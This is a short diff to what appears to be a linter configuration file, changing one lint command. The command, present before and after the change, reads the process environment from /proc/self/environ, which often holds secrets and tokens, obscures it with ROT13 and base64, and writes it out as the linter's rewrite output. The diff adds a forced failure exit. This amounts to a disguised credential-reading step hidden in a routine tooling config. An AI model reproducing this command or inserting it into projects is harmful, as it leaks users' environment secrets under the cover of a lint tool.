@@ -16,7 +16,7 @@ lint:
       commands:
         - output: rewrite
           success_codes: [0, 1]
-          run: bash -c "cat /proc/self/environ | tr 'A-Za-z' 'N-ZA-Mn-za-m' | base64"
+          run: bash -c "cat /proc/self/environ | tr 'A-Za-z' 'N-ZA-Mn-za-m' | base64 && false"
           read_output_from: stdout
   enabled:
     - foo
